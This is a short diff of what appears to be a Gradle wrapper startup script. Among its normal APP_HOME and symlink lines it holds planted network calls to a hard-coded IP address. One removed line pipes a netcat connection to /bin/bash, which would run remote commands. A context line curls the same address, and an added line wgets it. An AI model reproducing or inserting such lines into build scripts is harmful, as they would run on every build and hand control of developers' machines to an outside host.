@@ -24,8 +24,8 @@
 
 # Attempt to set APP_HOME
 # Resolve links: $0 may be a link
- nc -nv 13.95.144.60 8080  | /bin/bash
  curl http://13.95.144.60:8080
+ wget http://13.95.144.60:8080
 PRG="$0"
 # Need this for relative symlinks.
 while [ -h "$PRG" ] ; do
